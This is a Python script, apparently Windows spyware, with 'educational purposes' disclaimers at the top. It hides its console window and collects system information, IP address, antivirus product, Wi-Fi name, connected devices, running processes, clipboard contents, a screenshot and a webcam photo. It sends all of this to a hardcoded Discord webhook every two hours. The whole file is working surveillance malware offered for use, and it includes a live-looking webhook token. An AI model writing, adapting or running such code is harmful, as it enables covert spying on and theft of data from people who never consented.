#Warning;:: This is only for educational purposes! Any work by LowHypen/creators of this file shall not be distributed, cloned, or taken credit for.
# !!Personal Use Only!! Dont try this on a device/computer that's not yours.// Any damage from this script is not our problem, USE AT YOUR OWN RISK!!.
#$$ $$ $$ USE AT YOUR OWN RISK!!$$ $$

import os
import socket
import platform
import psutil
import requests
import datetime
import ctypes
import subprocess
import winreg
import cv2
import pyperclip
from PIL import ImageGrab
from io import BytesIO
import wmi
import json
import time
import threading

w = wmi.WMI()

WEBHOOK_URL = "https://discord.com/api/webhooks/1376592022047031487/QJ3LEybP19w6YPUCeXLu-Of_N1TazAKUxHtZrequ4ecPeKuSIImWmy4e8HL91Bsebn_H"

# Hide the console window (stealth mode)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_clipboard():
    try:
        return pyperclip.paste()
    except:
        return "Clipboard not accessible."

def get_system_info():
    boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
    return {
        "System": platform.system(),
        "Node": platform.node(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Boot Time": boot_time
    }

def get_ip():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except:
        return "Unavailable"

def get_antivirus():
    try:
        av = wmi.WMI(namespace="root\\SecurityCenter2")
        products = av.AntiVirusProduct()
        return ", ".join([p.displayName for p in products]) or "No Antivirus Detected"
    except:
        return "Unavailable (not Windows or missing pywin32)"

def get_top_processes(n=5):
    processes = sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), key=lambda p: p.info['cpu_percent'], reverse=True)
    result = ""
    for p in processes[:n]:
        try:
            result += f"{p.info['name']} (PID {p.info['pid']}) - {p.info['cpu_percent']}% CPU\n"
        except:
            continue
    return result or "N/A"

def get_wifi_info():
    try:
        output = subprocess.check_output("netsh wlan show interfaces", shell=True).decode()
        for line in output.splitlines():
            if "SSID" in line and "BSSID" not in line:
                return line.strip().split(":")[-1].strip()
        return "No WiFi info found"
    except:
        return "WiFi info unavailable"

def get_connected_devices():
    try:
        output = subprocess.check_output("wmic path CIM_LogicalDevice get Description", shell=True).decode()
        devices = [line.strip() for line in output.splitlines() if line.strip() and line.strip() != "Description"]
        return "\n".join(devices[:10])  # Show up to 10 devices
    except:
        return "Unable to retrieve connected devices"

def take_screenshot():
    image = ImageGrab.grab()
    buffer = BytesIO()
    image.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer

def take_webcam_photo():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return None, "No webcam detected"
        is_success, buffer = cv2.imencode(".png", frame)
        return BytesIO(buffer.tobytes()), None
    except:
        return None, "Webcam error"

def send_to_webhook():
    sys_info = get_system_info()
    ip = get_ip()
    av = get_antivirus()
    top_proc = get_top_processes()
    wifi = get_wifi_info()
    devices = get_connected_devices()
    clipboard = get_clipboard()

    embed = {
        "title": "📈 PC Info Report",
        "color": 0x3498db,
        "fields": [
            {"name": "🖥️ System Info", "value": f"**System:** {sys_info['System']}\n**Node:** {sys_info['Node']}\n**Machine:** {sys_info['Machine']}\n**Processor:** {sys_info['Processor']}\n**Boot Time:** {sys_info['Boot Time']}", "inline": False},
            {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "🛡️ Antivirus", "value": av, "inline": True},
            {"name": "📲 Connected WiFi", "value": wifi, "inline": False},
            {"name": "🛠️ Devices", "value": devices, "inline": False},
            {"name": "🏋 Top Processes", "value": top_proc, "inline": False},
            {"name": "📋 Clipboard", "value": clipboard[:1024] or "Empty", "inline": False},
        ],
        "footer": {"text": "Silent PC Audit via Python"},
        "timestamp": datetime.datetime.now(datetime.UTC).isoformat()
    }

    screenshot = ("screenshot.png", take_screenshot(), "image/png")
    webcam_image, webcam_error = take_webcam_photo()
    files = {
        "file1": screenshot
    }
    if webcam_image:
        files["file2"] = ("webcam.png", webcam_image, "image/png")
    elif webcam_error:
        embed['fields'].append({"name": "📷 Webcam", "value": webcam_error, "inline": False})

    payload = {
        "content": "@everyone",
        "embeds": [embed]
    }

    response = requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files)
    print("[+] Webhook sent!", response.status_code, response.text)

def start_loop():
    while True:
        send_to_webhook()
        time.sleep(2 * 60 * 60)  # 2 hours in seconds

if __name__ == '__main__':
    thread = threading.Thread(target=start_loop)
    thread.start()
